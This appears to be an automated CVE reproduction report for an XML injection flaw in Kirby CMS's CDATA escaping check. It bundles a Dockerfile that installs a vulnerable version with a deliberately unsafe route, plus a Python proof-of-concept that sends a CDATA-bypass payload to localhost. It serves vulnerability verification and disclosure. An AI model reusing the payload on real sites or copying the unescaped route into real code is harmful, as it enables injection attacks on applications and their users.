        "text": "# CVE-2026-32870 \u2014 getkirby/cms: XML Injection in Data Handler\n\n| Field | Value |\n|---|---|\n| **CVE ID** | CVE-2026-32870 |\n| **Date** | 2026-04-25 |\n| **Verdict** | \u2705 VERIFIED_SUCCESS |\n| **CVSS v3.1** | 6.9 |\n| **CWE** | INJECTION_FLAWS |\n| **Affected** | getkirby/cms |\n\n---\n\n## Why the Vulnerability Exists\nThe vulnerability exists in Kirby's `Xml` class, specifically within the `Xml::value()` method. This method is responsible for escaping values to be safely included in an XML document. It contains special logic to handle `CDATA` blocks: if a value is already a valid `CDATA` block, it is passed through without further escaping.\n\nThe flaw lies in the validation check for this `CDATA` passthrough. The check was not strict enough, allowing a string that *contained* a `CDATA` block, but also included other XML tags outside of it, to be considered valid. An attacker could craft a payload like `<"
      },
      {
        "text": "![CDATA[valid]]><injected>malicious</injected>` which would bypass the escaping mechanism.\n\nThis allows for XML Injection. Since the `Xml::value()"
      },
      {
        "text": "` method is used by other XML generation functions like `Xml::tag()`, `Xml::create()`, and the `Data::encode($data, 'xml')` handler, any part of an application that uses these functions with untrusted user input becomes vulnerable. The Kirby core itself does not use these functions with user input, so the vulnerability is only exposed if a site or plugin implements such a feature.\n\n---\n\n## Build Environment\nThe environment is built using `docker-compose`. It defines a single `web` service that uses a custom `Dockerfile`. The `Dockerfile` starts with a `php:8.2-apache` base image and installs Composer. It then uses Composer to install a vulnerable version of `getkirby/starterkit` (4.8.4, prior to the patched 4.9.0).\n\nTo expose the vulnerability, a custom API endpoint is added to the Kirby application. A `RUN` command in the `Dockerfile` appends a new route definition to `site/config/config.php`. This route, located at `/api/generate-xml`, takes a `content` parameter from the request and passes it directly to the vulnerable `Kirby\\Data\\Data::encode()` function, which then generates and returns an XML response. The service's port 80 is mapped to `localhost:8080` for the exploit script to connect.\n\n---\n\n## Exploitation \u2014 Step by Step\nThe exploitation process demonstrates the XML injection flaw by tricking the server into generating an XML document containing malicious tags.\n\n1.  **Environment Setup:** The `docker-compose up -d` command is run to build and start the vulnerable Kirby application. The application is now listening on `http://localhost:8080`.\n2.  **Payload Crafting:** The attacker crafts a payload that exploits the weak `CDATA` validation. The payload `<"
      },
      {
        "text": "![CDATA[User content]]><injected>This tag was injected</injected>` is designed to pass the validation while also containing an additional, unescaped XML element.\n3.  **Sending the Request:** The `exploit.py` script sends an HTTP GET request to the custom vulnerable endpoint: `http://localhost:8080/api/generate-xml`. The crafted payload is passed as the `content` query parameter.\n4.  **Vulnerable Processing:** On the server, the custom route handler receives the payload. It calls `Data::encode(['item' => ['value' => $payload]], 'xml')"
      },
      {
        "text": "`. Internally, Kirby's `Xml::value()` method processes the payload. Due to the flaw, it incorrectly allows the entire string to pass through unescaped.\n5.  **Malicious Response:** The server responds with an XML document. Instead of properly escaping the payload, it includes the injected tag directly:\n    ```xml\n    <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n    <root>\n      <item>\n        <value><"
      },
      {
        "text": "![CDATA[User content]]><injected>This tag was injected</injected></value>\n      </item>\n    </root>\n    ```\n6.  **Verification:** The `exploit.py` script receives this response, parses it, and checks for the existence of the `<injected>` tag. Since the tag is present, the script confirms the injection was successful and prints \"EXPLOIT_SUCCESS\".\n\n---\n\n## References\n- https://github.com/getkirby/kirby/security/advisories/GHSA-v82q-b25m-2ch3\n\n===FILE: docker-compose.yml===\nservices:\n  web:\n    build: .\n    ports:\n      - \"8080:80\"\n    volumes:\n      - ./poc:/var/www/html/site/controllers\n===END_FILE===\n\n===FILE: Dockerfile===\nFROM php:8.2-apache\n\n# Install dependencies for Kirby and Composer\nRUN apt-get update && apt-get install -y \\\n    unzip \\\n    libzip-dev \\\n    libpng-dev \\\n    libonig-dev \\\n  && docker-php-ext-install gd zip mbstring\n\n# Install Composer\nCOPY --from=composer:latest /usr/bin/composer /usr/bin/composer\n\n# Set working directory\nWORKDIR /var/www/html\n\n# Install a vulnerable version of Kirby Starterkit\n# Version 4.8.4 is before the patch in 4.9.0\nRUN composer create-project getkirby/starterkit:4.8.4 . --no-dev\n\n# Create a vulnerable endpoint to demonstrate the flaw\n# This adds a route to /site/config/config.php that uses the vulnerable Data::encode method\nRUN echo '<?php \\n\\\nreturn [ \\n\\\n    \"routes\" => [ \\n\\\n        [ \\n\\\n            \"pattern\" => \"api/generate-xml\", \\n\\\n            \"action\"  => function ()"
      },
      {
        "text": " { \\n\\\n                $kirby = kirby(); \\n\\\n                $content = $kirby->request()->get(\"content\", \"default\"); \\n\\\n                $data = [\"item\" => [\"value\" => $content]]; \\n\\\n                $xml = Kirby\\Data\\Data::encode($data, \"xml\"); \\n\\\n                return new Kirby\\Cms\\Response($xml, \"application/xml\"); \\n\\\n            } \\n\\\n        ] \\n\\\n    ], \\n\\\n    \"debug\" => true \\n\\\n];' > /var/www/html/site/config/config.php\n\n# Fix permissions\nRUN chown -R www-data:www-data /var/www/html\n===END_FILE===\n\n===FILE: exploit.py===\nimport requests\nimport sys\n\ndef exploit(target_url):\n    \"\"\"\n    Exploits the XML Injection vulnerability in Kirby CMS.\n    \"\"\"\n    # Payload designed to trick the CDATA check\n    payload = \"<"
      },
      {
        "text": "![CDATA[some valid data]]><injected>This tag was injected</injected>\"\n    params = {\n        \"content\": payload\n    }\n\n    print(f\"[*] Sending malicious payload to {target_url}\")"
      },
      {
        "text": "\n    try:\n        response = requests.get(target_url, params=params, timeout=10)\n        response.raise_for_status()\n\n        # Check if the injected tag is present in the response\n        if \"<injected>This tag was injected</injected>\" in response.text:\n            print(\"[+] Vulnerability confirmed. The server response contains the injected XML tag.\")\n            print(\"EXPLOIT_SUCCESS\")\n        else:\n            print(\"[-] Exploitation failed. The injected tag was not found in the response.\")\n            print(\"[-] Server response:\")\n            print(response.text)\n\n    except requests.exceptions.RequestException as e:\n        print(f\"[!] An error occurred: {e}\")\n        sys.exit(1)\n\nif __name__ == \"__main__\":\n    url = \"http://localhost:8080/api/generate-xml\"\n    exploit(url)\n===END_FILE==="
      }
    ]
